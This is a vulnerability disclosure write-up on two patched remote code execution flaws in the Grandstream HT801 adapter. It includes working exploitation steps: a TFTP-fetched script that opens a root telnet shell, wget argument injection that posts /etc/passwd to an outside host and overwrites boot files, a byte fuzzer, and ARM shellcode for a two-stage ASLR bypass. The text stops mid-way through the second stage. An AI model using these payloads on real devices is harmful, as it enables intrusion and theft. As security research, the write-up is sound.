This article describes the identification and exploitation of two authenticated remote code execution vulnerabilities that we found during a time-bounded security assessment of the Grandstream’s HT801 Analog Telephone Adapter. Both vulnerabilities are exploitable via the limited configuration shell which is accessible over SSH/Telnet. These and other less critical findings were addressed by Grandstream with the release of the firmware version [1.0.29.8](http://firmware.grandstream.com/BETA/Release_Note_HT80x_1.0.29.8.pdf).

[CVE-2021-37915](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37915): Authenticated Remote Code Execution via debugging functionality during the startup of the device

[CVE-2021-37748](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37748): Authenticated stack based buffer overflow in the "manage\_if" configuration parameter handling

Device details can be found [here](http://www.grandstream.com/products/gateways-and-atas/analog-telephone-adaptors/product/ht801).

### Firmware unpacking

To follow the article please get a copy of a firmware file [here](https://firmware.grandstream.com/Release_HT801_1.0.27.2.zip). The firmware blob is encrypted, however, due to the great work done by [BigNerd95](https://github.com/BigNerd95/Grandstream-Firmware-HT802) we can easily extract it. The static AES key used for encryption, is being reused across the line of devices.

We are working inside an Ubuntu 20.04.2 LTS vm:

```
$ mkdir workspace && cd workspace
$ export WS=$(pwd)

```

Download & unzip the firmware:

```
$ echo "check_certificate = off" >> ~/.wgetrc
$ wget https://firmware.grandstream.com/Release_HT801_1.0.27.2.zip
$ unzip Release_HT801_1.0.27.2.zip

```

Clone the extraction tool:

```
$ git clone https://github.com/BigNerd95/Grandstream-Firmware-HT802
$ cd Grandstream-Firmware-HT802/FirmwarePatcher/

```

Extract the firmware:

```
$ ./GSFW.py extract -i $WS/Release_HT801_1.0.27.2/ht801fw.bin -d extracted -k 37d6ae8bc920374649426438bde35493

		Body key: 000ea99a07e5031d1034fd2000010000
		Decrypting...

```

In particular, we are interested in the "ht801base.bin" and "ht801prog.bin" files. The first one contains the root file system of the underlying Linux OS and the second one contains additional software. Both files can be easily extracted using the [binwalk](https://github.com/ReFirmLabs/binwalk) tool.

### Device Administration via Limited Shell

By default, the device exposes web and ssh services for administration. Default credentials for both services are "admin:admin". Additionally, a Telnet service can be enabled via the web interface.

The "CONFIG>" submenu allows us to set device parameters which in turn are saved to the device's [nvram](https://en.wikipedia.org/wiki/Non-volatile_random-access_memory). All of the functionality is implemented in the /sbin/gs\_config binary.

```

```

## CVE-2021-37915

There are multiple shell scripts inside the /bin folder which are executed upon boot. One of them is the "ht\_start.sh" script. It contains the following snippet:

```
 1#
 2# Start gs_ata
 3#
 4if [ ! -z "`nvram get gdb_debug_server`" ]; then
 5    GDB_SERVER_IP=`nvram get gdb_debug_server`
 6    GDB_SERVER_PORT=9876
 7    cd /tmp/
 8    tftp -g -r gdbserver ${GDB_SERVER_IP}
 9    if [ -f ./gdbserver ]; then
10        chmod +x gdbserver
11        echo "Starting gs_ata with GDB support @ ${GDB_SERVER_IP}:${GDB_SERVER_PORT}"
12        ./gdbserver ${GDB_SERVER_IP}:${GDB_SERVER_PORT} /app/bin/gs_ata &
13    fi
14else
15    echo "Starting gs_ata..."
16    /app/bin/gs_ata &
17    echo $! > /var/run/gs_ata.pid
18fi

```

Essentially, if a "gdb\_debug\_server" value is set (4), the script tries to download a "gdbserver" file from the specified host via TFTP (8) and executes it (13). By setting the value to an IP address of a malicious TFTP server and then rebooting the device - we can gain Remote Code Execution (RCE) as root upon device boot.

On our box we have to setup a TFTP server and create a file:

```
$ cat /srv/tftp/gdbserver
telnetd -l /bin/ash -p 9999 &

```

After making sure that our TFTP server is up and running, we can proceed to activate the hidden setting on the device and reboot it:

```
$ ssh admin@192.168.1.128
Grandstream HT801 Command Shell Copyright 2006-2021
admin@192.168.1.128's password:
GS> config
CONFIG> set gdb_debug_server 192.168.1.102
gdb_debug_server = 192.168.1.102
CONFIG> commit
Changes are commited.
CONFIG> get gdb_debug_server
gdb_debug_server = 192.168.1.102
CONFIG> exit
GS> reboot
Rebooting...

```

Upon the booting process, the device will fetch and execute the "gdbserver" script hosted on our TFTP server. A root shell is then waiting on port 9999:

```
$ telnet 192.168.1.128 9999
Trying 192.168.1.128...
Connected to 192.168.1.128.
Escape character is '^]'.
# uname -nrsm
Linux HT8XX 3.4.20-rt31-dvf-v1.2.6.1-rc2 armv5tejl

```

Another similar bug lurks in the "gs\_test\_suite.sh" file:

```
 1#!/bin/sh
 2
 3CUR_DIR=`pwd`
 4TEST_DIR=gs_test
 5TEST_SCRIPT=gs_test_script.sh
 6TEST_SERVER=`nvram get gs_test_server`
 7TEST_SERVER_PORT=80

 9if [ ! -d /${TEST_DIR} ]; then
10        mkdir /${TEST_DIR}
11fi
12
13cd /${TEST_DIR}
14
15wget -q -t 2 -T 5 http://${TEST_SERVER}:${TEST_SERVER_PORT}/${TEST_SCRIPT}
16if [ "$?" = "0" ]; then
17    echo "Finished downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
18    chmod +x ${TEST_SCRIPT}
19    echo "Starting GS Test Suite..."
20    ./${TEST_SCRIPT} http
21else
22    echo "ERROR downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
23    echo "Falling back to TFTP server..."
24    tftp -g -r ${TEST_SCRIPT} ${TEST_SERVER}
25    if [ "$?" = "0" ]; then
26        echo "Finished downloading ${TEST_SCRIPT} from TFTP ${TEST_SERVER}"
27        chmod +x ${TEST_SCRIPT}
28        echo "Starting GS Test Suite..."
29        ./${TEST_SCRIPT} tftp
30    else
31        echo "Failed to download ${TEST_SCRIPT} via HTTP or TFTP check test server ip address"
32    fi
33fi
34
35cd ${CUR_DIR}

```

Here, by setting the "gs\_test\_server" parameter (6) we can inject into the "wget" command (15), which would allow us to read and write arbitrary files. The injection is as follows:

```
set gs_test_server (webserver address)(space)(injection)(space)

```

The space at the end is important. Otherwise, our command would be concatenated with the "TEST\_SERVER\_PORT" variable.

Extract any file from the OS:

```
CONFIG> set gs_test_server 192.168.1.198/ --post-file=/etc/passwd

```

Overwrite/Create any file on the OS:

```
CONFIG> set gs_test_server 192.168.1.198/xxx -e output_document=/tmp/boom

CONFIG> set gs_test_server 192.168.1.198/xxx -O /tmp/boom

```

Most of the important parts of the OS are mounted read-only. One way to achieve command execution is by overwriting the "/tmp/config/rc.conf file", which is used by several scripts upon boot.

We can obtain the original "rc.conf" file from the extracted firmware and prepend one command that will spawn the Telnet server:

```
$ head -n 5 rc.conf
telnetd -l /bin/ash -p 1337 &

export conf_sourced=1

export hostname="HT8XX"

```

The next step is to set the variable to point to our webserver and reboot the device. The injected wget flag will force-save our file.

```
CONFIG> set gs_test_server 192.168.1.198/xxx -O /tmp/config/rc.conf
CONFIG> commit
CONFIG> reboot

```

After reboot, the root shell is available on port 1337:

```
$ telnet 192.168.1.128 1337
Trying 192.168.1.128...
Connected to 192.168.1.128.

```

## CVE-2021-37748

A stack-based overflow affecting the handling of the "manage\_if" config parameter allows an authenticated attacker to break out of the limited configuration interface and get a root shell on the device.

### Analysis

We started with the static analysis of the gs\_config binary, which implements the limited configuration shell. It provides an authenticated user with a quick text-based interface available over SSH (and optionally Telnet). For fun, we will communicate with the device over Telnet.

When it comes to the IOT world, the probability of finding old-school bugs is always an option. We hunted for the obvious candidates, such as strcpy() - and indeed, we identified multiple instances. The most promising one turned out to be at 0xB3A4:

![grandstream-strcpy.png](/media/images/grandstream-strcpy.width-800.png)

When a user types the "status" command from the initial menu - among other things a value for the "Management Interface" called "manage\_if" is retrieved from nvram via the "nvram\_get" function and is placed into a local buffer via strcpy(). The interface value is later used for resolving and displaying the "Management IPv4 Address". By placing a large string via the "set manage\_if VALUE" command and executing a "status" command we can overflow the stack buffer and overwrite important values on the stack, i.e. the saved return address of the local function, thereby taking control of the execution flow.

### Control over PC

The pointer to the buffer returned by "nvram\_get" at 0xB394 (value of the "manage\_if" setting pulled from the nvram) will be stored in the R0 register. Then, the address from R0 is being copied into the R1 register - this is the second argument for strcpy() - our controlled data (src). The R0 register is then being set to a local buffer stored on the stack (dest):

```
0xb394    bl     #nvram_get@plt <nvram_get@plt>

   0xb398    mov    r1, r0
   0xb39c    add    r0, sp, #0x7b0
   0xb3a0    add    r0, r0, #0xc
 ► 0xb3a4    bl     #strcpy@plt <strcpy@plt>
        dest: 0xcee69bf4 ◂— 9 /* '\t' */           # stack
        src: 0xc6d3b0a9                            # nvram

```

The strcpy() function does not perform bounds checking, therefore, we are able to overflow with the "trusted" data returned from the nvram.

Further down the path, another interesting thing happens. The prologue of the 0x984C sub-routine will push the LR (0xB3C0) to the stack. The stack address pointing to the beginning of our payload is being passed (among others) as the argument for the 0x984C sub-routine:

![grandstream-984c.png](/media/images/grandstream-984c.width-800.png)

The 0x984C sub-routine:

![984c-disasm.png](/media/images/984c-disasm.width-800.png)

The R7 register holds the pointer to our data (source), and the current stack pointer is being used as the destination for the strcpy() function at 0x9880, thus overflowing the stack. When the ioctl() system call at 0x9890 fails, the branch to the close() function at 0x98E0 is done, and the sub-routine will attempt to return:

![call-graph.png](/media/images/call-graph.width-800.png)

Next, the sub-routine is going to its epilogue at 0x9938:

![epilogue.png](/media/images/epilogue.width-800.png)

It restores the values from the overflowed stack, thus, popping our data into the respective registers:

### Exploit development

By abusing the aforementioned CVE-2021-37915 we can get root shell access to the device and set up a remote debugging environment for dynamic analysis and exploit development purposes. This approach will simplify the process, as we don't need to handle often complicated emulation dependencies and we can work on the actual hardware.

The following payload overwrites registers R4-R7 with AAAA's and the PC (program counter) with BBBB's:

```
$ python -c 'print(b"set manage_if " + b"A"*52+b"BBBB")'
b'set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'

```

Steps to reproduce the crash from within the configuration shell:

```
GS> config
CONFIG> set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
manage_if = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
CONFIG> commit
Changes are commited.
CONFIG> exit
GS> status
Product Model: HT801

### Long live Return-to-Zero-Protection

What is interesting is ASLR on the device is configured as follows:

```
# cat /proc/sys/kernel/randomize_va_space
1

```

From the Kernel [documentation](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt) we can read that:

```
0 - Turn the process address space randomization off. This is the default for architectures that do not support this feature anyways, and kernels that are booted with the "norandmaps" parameter.

1 - Make the addresses of mmap base, stack and VDSO page randomized. This, among other things, implies that shared libraries will be loaded to random addresses.  Also for PIE-linked binaries, the location of code start is randomized. This is the default if the CONFIG_COMPAT_BRK option is enabled.

2 - Additionally enable heap randomization. This is the default if CONFIG_COMPAT_BRK is disabled.

```

We can confirm how it affects randomization on the device:

```
# for i in `seq 1 5`; do ldd /bin/ls | grep /libc.so; done
        libc.so.0 => /lib/libc.so.0 (0xc6e7c000)
        libc.so.0 => /lib/libc.so.0 (0xc6f10000)
        libc.so.0 => /lib/libc.so.0 (0xc6f45000)
        libc.so.0 => /lib/libc.so.0 (0xc6f3d000)
        libc.so.0 => /lib/libc.so.0 (0xc6ea9000)

# for i in `seq 1 5`; do grep heap /proc/self/maps; done
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]

```

Shared libraries are correctly loaded at random addresses, however, the heap is at a static address. We can confirm this by enforcing heap randomization:

```
# echo 2 > /proc/sys/kernel/randomize_va_space
# for i in `seq 1 5`; do grep heap /proc/self/maps; done
00d82000-00d83000 rwxp 00000000 00:00 0          [heap]
000e4000-000e5000 rwxp 00000000 00:00 0          [heap]
0079f000-007a0000 rwxp 00000000 00:00 0          [heap]
01fd0000-01fd1000 rwxp 00000000 00:00 0          [heap]
00a18000-00a19000 rwxp 00000000 00:00 0          [heap]

```

Knowing that the heap is not randomized, we have been looking for a way to utilize it for our purposes. The obvious choice is to look for the cross-references to the malloc() function, which lead to a set of imported functions from the libnvram.so shared library. The most interesting ones are nvram\_get,nvram\_set and nvram\_commit. They're responsible for the device's nvram read/write operations.

```
$ readelf -ds gs_config | grep nvram
 0x00000001 (NEEDED)                     Shared library: [libnvram.so]
    10: 00009080     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_all
    19: 00009194     0 FUNC    GLOBAL DEFAULT  UND nvram_commit_sync
    37: 0000917c     0 FUNC    GLOBAL DEFAULT  UND nvram_commit
    44: 000093b0     0 FUNC    GLOBAL DEFAULT  UND nvram_get
    47: 000090d4     0 FUNC    GLOBAL DEFAULT  UND nvram_set
    54: 000092c0     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_not_list
    59: 00009158     0 FUNC    GLOBAL DEFAULT  UND nvram_check_password
    60: 000091f4     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_list
    75: 00009218     0 FUNC    GLOBAL DEFAULT  UND nvram_unset

```

During the analysis of the libnvram.so shared library, we've noticed that if the length of the configuration setting plus its value is larger than 100 bytes (hex 0x64), the nvram\_set wrapper is going to call malloc(), and thus will request the memory from the heap.

![malloc.png](/media/images/malloc.width-800.png)

The following configuration shell command will force the program to allocate our controlled data at the static address on the heap:

```
CONFIG> set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

Let's confirm in GDB:

```
gef➤  search-pattern "AAAAAAAAAAAAAAAAAA"
[+] Searching 'AAAAAAAAAAAAAAAAAA' in memory
[+] In '[heap]'(0x16000-0x17000), permission=rwx
  0x16012 - 0x16049  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16024 - 0x1605b  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16036 - 0x1606d  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16048 - 0x1606d  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  0x1605a - 0x1606d  →   "AAAAAAAAAAAAAAAAAAA"

```

We can defeat ASLR by storing our payload in the known, static **rwx** heap location, then overflow and redirect the program flow to it. This basically renders it as the **Return-to-Zero-Protection** scenario.

### Size and Bad Bytes Limitations

When trying to exploit a buffer overflow vulnerability it is important to identify the limitations of the shellcode that we can use. These are the questions that we need to answer before a reliable exploit can be created:

* What is the size limitation of the shellcode?
* What are the bad bytes?

By sending a sizeable payload, we can observe how many bytes arrive and are placed on the heap. This should tell us the maximum size of the consecutive bytes that we are working with.

Trying all possible bytes (0-255), one by one, allows us to deduce the bad ones that we should avoid in our final payload:

```
 1from pwn import *
 2
 3context.timeout=2
 4context.log_level = 'error'
 5
 6IP='192.168.1.128'
 7PASS='admin'
 8
 9avoid = []
10
11def login():
12    p = remote(IP,23)
13    p.sendlineafter('Password: ',PASS)
14    p.sendlineafter('GS> ','config')
15    return p
16
17def fuzz(byte):
18    p = login()
19    try:
20     p.sendlineafter('CONFIG> ',b'set manage_if A-'+byte+b'-B')
21     p.sendlineafter('CONFIG> ',b'get manage_if')
22     p.recv()
23     if not b'A-'+byte+b'-B' in p.recv() or not p.recv():
24         #print("Bad: ",repr(byte))
25         avoid.append(byte)
26    except:
27     pass
28    p.close()
29
30x=make_packer('all')
31for i in range(0,256):
32    fuzz(x(i))
33
34print(avoid)

```

Bytes that cannot be stored in the "manage\_if" setting:

```
$ python ht-fuzz.py
[b'\x00', b'\x04', b'\t', b'\n', b'\r', b'\x11', b'\x12', b'\x13', b'\x15', b'\x16', b'\x17', b'\x1a', b'\x1c', b'\x7f', b'\xca', b'\xff']

```

The limitation of the 0xFF byte is important, because it does not allow us to easily switch to Thumb mode via BX/BLX instructions, as those instructions will always contain the 0xFF byte in the opcode:

```
>>> from pwn import *
>>> context.arch='arm'
>>> asm('bx r4;')
b'\x14\xff/\xe1'
>>> asm('blx r4;')
b'4\xff/\xe1'

```

Our exploit is communicating with the device via the Telnet protocol. What is interesting and can be easily overlooked, is the fact that the 0xFF byte (255 decimal) is the IAC (Interpret As Command) byte which signals that the next byte is a Telnet command. Therefore, a 0xFF byte in our shellcode will not be interpreted as data but, along with the following byte, will be interpreted as a Telnet command. If we look at the [RFC](https://datatracker.ietf.org/doc/html/rfc854) for the Telnet protocol, we can find a simple solution to this problem:

*All TELNET commands consist of at least a two byte sequence: the "Interpret as Command" (IAC) escape character followed by the code for the command. The commands dealing with option negotiation are three byte sequences, the third byte being the code for the option referenced. This format was chosen so that as more comprehensive use of the "data space" is made -- by negotiations from the basic NVT, of course -- collisions of data bytes with reserved command values will be minimized, all such collisions requiring the inconvenience, and inefficiency, of "escaping" the data bytes into the stream.* ***With the current set-up, only the IAC need be doubled to be sent as data, and the other 255 codes may be passed transparently****.*

To successfully sneak the 0xFF byte as data we have to double it:

```
>>> asm('bx r4').replace(b'\xff',b'\xff\xff')
b'\x14\xff\xff/\xe1'

```

### First exploitation path

The ARM processor can execute in 32-bit and 16-bit modes named ARM and Thumb respectively. To reduce the size and avoid NULL bytes, most of the shellcodes switch to 2-byte Thumb mode.

Knowing the available space on the heap and the subset of bad bytes, we can craft new or adjust existing shellcode for our target CPU.

[Here](http://shell-storm.org/shellcode/files/shellcode-665.php) is the 30-bytes long ARM rev5 shellcode that we can tailor for our purposes:

```
8054:   e28f3001    add r3, pc, #1  ; 0x1
8058:   e12fff13    bx  r3
805c:   4678        mov r0, pc
805e:   300a        adds    r0, #10
8060:   9001        str r0, [sp, #4]
8062:   a901        add r1, sp, #4
8064:   1a92        subs    r2, r2, r2
8066:   270b        movs    r7, #11
8068:   df01        svc 1
806a:   2f2f        cmp r7, #47
806c:   6962        ldr r2, [r4, #20]
806e:   2f6e        cmp r7, #110
8070:   6873        ldr r3, [r6, #4]

```

The above shellcode produces a set of bad bytes. We can fix that by swapping the unwanted instructions as follows:

```
>>> from pwn import *
>>> context.arch='arm'

# original instruction from the shellcode
>>> asm('add r3,pc,#1').hex()
'01308fe2'
# we use r4 to avoid bad byte on the following branch instruction
>>> asm('add r4,pc,#1').hex()
'01408fe2'
# branch instruction producing bad byte: 0x13
>>> asm('bx r3').hex()
'13ff2fe1'
# we use the r4 register instead and we double patch the Telnet's IAC 0xff byte
>>> asm('bx r4').replace(b'\xff',b'\xff\xff').hex()
'14ffff2fe1'

# switch CPU context
>>> context.arch='thumb'
# decimal 10 will produce the bad byte: 0x0a
>>> asm('adds r0, #10').hex()
'0a30'
# we can securely change it to 0x0b
>>> asm('adds r0, #11').hex()
'0b30'
# subs instruction producing bad byte: 0x1a
>>> asm('subs r2, r2, r2').hex()
'921a'
# we swap it to the XOR instrution
>>> asm('eors r2, r2, r2').hex()
'5240'

```

After the adjustments, we can produce a small, bad-byte safe shellcode that will spawn a shell on our target device over Telnet:

```
# ARM926EJ-S rev 5 (v5l)
# execve("/bin/sh","/bin/sh",0)
sc = b''
sc += asm('add r4,pc,#1')
# Double byte patch (Telnet 0xff IAC byte patch), switch to Thumb
sc += asm('bx r4').replace(b'\xff',b'\xff\xff')

# Switch CPU context
context.arch='thumb'

sc += asm("""
mov r0, pc;
adds r0,#11;
str r0,[sp,#4];
add r1,sp,#4;
eors r2,r2,r2;
movs r7,#11;
svc 1;
cmp r7,#47;
ldr r2,[r4,#20];
cmp r7,#110;
ldr r3,[r6,#4]
""")

```

In the first payload we are going to request more than 100 bytes and place our shellcode in the known, static address on the heap. We are not going to trigger the vulnerablity yet, we're just abusing the functionality to store our data.

```
payload = b'A'*134 + sc

```

We can verify that our shellcode is indeed intact and at the static address on the heap:

```
gef➤  x/2i 0x16098
   0x16098:	add	r4, pc, #1
   0x1609c:	bx	r4

```

The rest of the opcodes starts at 0x160a0, however, we are dealing with 2-byte aligned Thumb instructions, hence +1 is added to the address:

```
gef➤  x/11i 0x160a1
   0x160a1:	mov	r0, pc
   0x160a3:	adds	r0, #11
   0x160a5:	str	r0, [sp, #4]
   0x160a7:	add	r1, sp, #4
   0x160a9:	eors	r2, r2
   0x160ab:	movs	r7, #11
   0x160ad:	svc	1
   0x160af:	cmp	r7, #47	; 0x2f
   0x160b1:	ldr	r2, [r4, #20]
   0x160b3:	cmp	r7, #110	; 0x6e
   0x160b5:	ldr	r3, [r6, #4]

```

The second payload will be shorter and will overwrite the return value on the stack with the precise address of our stored payload. To trigger the vulnerability we will exit the config sub-routine and run the "status" command from the main menu, as described in the previous sections. The program flow continues and hits our shellcode, which spawns the root shell.

### Another exploitation strategy

Rather than trying to exploit the program in one shot by using the execve shellcode on the rwx heap, we can also use a strategy that is quite common in Capture The Flag (CTF) exploitation challenges. If the binary runs in an ASLR enabled environment, then this two-step process can be used whenever possible:

* **Stage1 shellcode** - Leak the address of the puts() function, for example, from memory; based on that, calculate the addresses of the system() function and of the "/bin/sh\0" string
* **Stage2 shellcode** - Utilise information from the leak and call system('/bin/sh\0')

### A way to move arbitrary values to registers

When trying to call any function in ARM architecture the arguments are passed in the registers R0, R1, R2, and R3. If there's a function that takes more than 4 arguments then the stack is utilized starting with the 5th argument. So, in the most common cases of exploit development on the Linux OS we will be utilizing single argument functions such as puts() and system() and we will need to load an arbitrary address into R0.

Even though the registers on 32bit ARM architecture are 4 bytes, the MOV instruction for immediate values has a limitation:

```
MOV{cond} Rd, #imm16

imm16 is any value in the range 0-65535.

```

Also, using the R0 register will produce 0x00 (a bad byte) in the opcode:

```
>>> from pwn import *
>>> context.arch = 'arm'
>>> asm('mov r0, 1')
b'\x01\x00\xa0\xe3'

```

We can avoid that by utilizing a different register such as R6 and finding a way to move the result back to R0 afterwards:

```
>>> asm('mov r6, 1')
b'\x01`\xa0\xe3'

```

We can load arbitrary 4 byte values into R6 byte-by-byte and shift the result to the left by 8 bits as such:

```
mov r6, #0x1            ; R6 == 0x00000001
mov r6, r6, LSL #8      ; R6 == 0x00000100
add R6, R6, #0x58       ; R6 == 0x00000158
mov r6, r6, LSL #8      ; R6 == 0x00015800
add R6, R6, #0x9c       ; R6 == 0x0001589c

```

In this example we have loaded R6 with the address of puts@GOT, which is 0x1589c:

```
>>> e = ELF("./gs_config",checksec=False)
>>> hex(e.got.puts)
'0x1589c'

```

The most obvious way of moving the R6 value to R0 has the dreaded 0x00 byte:

```
>>> asm('mov r0, r6')
b'\x06\x00\xa0\xe1'

```

We can try adding a benign shift/rotate operation to change the opcodes, however, using a "0" constant changes nothing:

```
>>> asm('mov r0, r6, ror 0')
b'\x06\x00\xa0\xe1'

```

Fortunately, at the time of the crash we have several registers with value 0 already in them. One such register is R8, which allows us to avoid bad bytes:

```
>>> asm('mov r0, r6, ROR r8')
b'v\x08\xa0\xe1'

```

So, connecting all the instructions above we have a way of moving arbitrary values into the R0 register while avoiding bad bytes.

This piece of assembly will load 0x1589c (puts@GOT address) into R0:

```
; assuming r8==0
mov r6, #0x1            ; R6 == 0x00000001
mov r6, r6, LSL #8      ; R6 == 0x00000100
add R6, R6, #0x58       ; R6 == 0x00000158
mov r6, r6, LSL #8      ; R6 == 0x00015800
add R6, R6, #0x9c       ; R6 == 0x0001589c
mov r0, r6, ROR r8      ; R0 == 0x0001589c

```

For future reference, let's call it "load\_puts\_got":

```
load_puts_got = asm("""
mov r6, #0x1;
mov r6, r6, lsl #8;
add r6, r6, #0x58;
mov r6, r6, lsl #8;
add r6, r6, #0x9c;
mov r0, r6, ror r8
""")

```

### Stage 1

Stage 1 is responsible for leaking the address of a function of our choice. Having the leak we can calculate the base address in which the uClibc shared library was loaded during the runtime.

The target binary is dynamically linked and was not compiled as a Position Independent Executable (PIE), therefore, it will not randomize its instruction addresses nor memory maps upon each execution. The base address of the loaded ELF will be at 0x8000:

```
$ file /tmp/gs_config
/tmp/gs_config: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked,
interpreter /lib/ld-uClibc.so.0, stripped

$ pwn checksec /tmp/gs_config
[*] '/tmp/gs_config'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)

```

Since our target binary is not PIE, the address of the puts() function in The Procedure Linkage Table (PLT) is known and static. The Procedure Linkage Table holds an entry for each external function reference. As an argument to the function, we will use the GOT address of puts() itself. The Global Offset Table (GOT) is a large table of function pointers to the actual memory location of external functions. Basically - jumping to the PLT entry for the function equals calling the function.

In short - we will call puts@plt(puts@got) to leak the current address of the uClibc's puts() from memory.

A good candidate, which allows us to continue execution without a crash after the leak, is inside the "CONFIG>" sub-routine and is located at the 0xA348 address. Straight after it, we have a branch instruction that goes back towards the start of the sub-routine. There's a small issue that we need to fix before the execution can continue after that branch instruction. Due to the overflow, we are overwriting certain registers which are used by the program to function properly.

As we can see, before the address of the branch instruction we have a function prologue:

```
.text:00009AC4    PUSH    {R4-R11,LR}
.text:00009AC8    LDR     R4, =stdout
.text:00009ACC    SUB     SP, SP, #0x254
.text:00009AD0    LDR     R11, =stdin
.text:00009AD4    LDR     R7, =__ctype_b
.text:00009AD8    ADD     R5, SP, #0x278+var_5C
.text:00009ADC    ADD     R1, R5, #4
.text:00009AE0    ADD     R6, SP, #0x278+var_30
.text:00009AE4    STR     R1, [SP,#0x278+var_264]

```

We can see that registers R4, R7 and R11 hold the stdout, \_\_ctype\_b, and stdin values which are important for further execution. Therefore, in order to continue the execution flow after the leak, we need to restore those values.

### Important register fix

The aforementioned stdout, \_\_ctype\_b, and stdin values are stored at fixed addresses in the .bss segment which contains statically allocated variables that are declared but have not been assigned a value yet:

```
.bss:0001592C ; Segment type: Uninitialized
.bss:0001592C                 AREA .bss, DATA
.bss:0001592C                 ; ORG 0x1592C
.bss:0001592C                 EXPORT stdout
.bss:0001592C stdout          % 4                  ; DATA XREF: LOAD:000084D8↑o
.bss:0001592C                                      ; LOAD:00008748↑o ...
.bss:0001592C                                      ; Copy of shared data
.bss:00015930                 EXPORT __ctype_b
.bss:00015930 __ctype_b       % 4                  ; DATA XREF: LOAD:00008708↑o
.bss:00015930                                      ; sub_9AC4+10↑o ...
.bss:00015930                                      ; Copy of shared data
.bss:00015934                 EXPORT stdin
.bss:00015934 stdin           % 4                  ; DATA XREF: LOAD:000084C8↑o
.bss:00015934                                      ; sub_9AC4+C↑o ...
.bss:00015934                                      ; Copy of shared data

```

At the moment of the overflow, the R10 register holds a value which is quite close to the ones we need loaded:

```
pwndbg> i r
r0             0x0                 0
r1             0x8915              35093
r2             0xffffffff          4294967295
r3             0x10                16
r4             0x42424242          1111638594
r5             0x42424242          1111638594
r6             0x42424242          1111638594
r7             0x42424242          1111638594
r8             0x0                 0
r9             0x0                 0
r10            0x16170             90480
r11            0x0                 0
r12            0xffffffff          4294967295
sp             0xcecdd428          0xcecdd428
lr             0x98e8              39144
pc             0x42424240          0x42424240
cpsr           0x10                16

```

We can use R10 to do some simple math and load correct values into R4, R7 and R11. The following snippet will "fix" the registers (all the while avoiding the bad bytes):

```
sub r4, r10, #2000         ; r4 = 0x16170 - 2000 = 0x159a0
sub r11, r4, #108          ; r11 = 0x159a0 - 108 = 0x15934 => stdin
sub r7, r4, #112           ; r7 = 0x159a0 - 112 = 0x15930 => __ctype_b
sub r4, r4, #116           ; r4 = 0x159a0 - 116 = 0x1592c => stdout

```

We will call it "fix\_regs":

```
fix_regs = asm("""
sub r4,r10, #2000;
sub r11, r4, #108;
sub r7, r4, #112;
""")

```

What is left to do, is to jump to the PLT address of the puts() function, let's call it "jmp\_puts". We combine all of the above as a **Stage1** shellcode:

```
fix_regs = asm("""
sub r4,r10, #2000;
sub r11, r4, #108;
sub r7, r4, #112;
""")
load_puts_got = asm("""
mov r6, #0x1;
mov r6, r6, lsl #8;
add r6, r6, #0x58;
mov r6, r6, lsl #8;
add r6, r6, #0x9c;
mov r0, r6, ror r8
""")
jmp_puts = asm("""
mov r6, #0xA3;
mov r6, r6, lsl #8;
add r6, r6, #0x48;
mov r1, r8;
mov pc, r6;
""")

```

### Stage 2

The plan is to craft a shellcode that will load the "/bin/sh\0" string into the R0 register and call system(). Having defeated ASLR with **Stage1** shellcode, we can easily calculate the required addresses. The aforementioned problem of bad bytes complicates it a bit. We cannot directly put a value into the R0 register.

The NULL terminated "/bin/sh" string is located at the 0x60eb0 offset in the uClibc and the system() function is 0x5e54c away from the uClibc base address:

```
>>> from pwn import *
>>> context.arch='arm'
>>> libc = ELF("libuClibc-0.9.33.1-git.so",checksec=False)
>>> hex(next(libc.search(b'/bin/sh\0')))
'0x60eb0'
>>> hex(libc.sym.system)
'0x5e54c'

```

Other way around to quickly figure out the offsets:

```
$ strings -tx libuClibc-0.9.33.1-git.so | grep /bin/sh
  60eb0 /bin/sh

$ readelf -s libuClibc-0.9.33.1-git.so | grep __libc_system
   855: 0005e54c   108 FUNC    GLOBAL DEFAULT    7 __libc_system

```

To safely sneak the calculated "/bin/sh" address stored in R6 into the R0 register, we will use the aforementioned technique and perform a right bit-shift using NULL in the R2 register. This is not going to change the value of the R6 or R0 registers, but the instruction will provide bad-byte-safe opcode:

```
; assuming r2 == 0
mov r0, r6, ror r2;

```

Having the leak, we can automate the **Stage2** shellcode generation with the following snippets:

```
# offset = leak - libc_base
libc_base = leak - 0x32654
system = libc_base + 0x5e54c
binsh = libc_base + 0x60eb0

q,w,e,r = unpack('4B',pack('>I',binsh))
load_binsh = asm("""
mov r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r0, r6, ror r2;
""" % (q,w,e,r))

